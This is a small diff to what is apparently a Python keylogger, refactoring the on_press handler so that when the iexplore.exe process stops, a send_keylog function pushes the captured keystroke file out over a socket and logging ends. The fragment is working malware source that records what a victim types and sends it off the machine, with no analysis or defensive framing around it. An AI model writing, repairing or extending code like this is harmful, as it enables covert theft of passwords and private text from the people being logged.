@@ -19,9 +19,7 @@ def send_keylog (): #sending the keylog
     s.send (file_data)
 
 def on_press (key): #logging if a key is pressed
-    if "iexplore.exe" in (p.name() for p in psutil.process_iter()):  #if iexplore.exe process stops quit
-        print()
-    else:
+    if "iexplore.exe" not in (p.name() for p in psutil.process_iter()):  #if iexplore.exe process stops -> quit
         send_keylog()
         return False
     
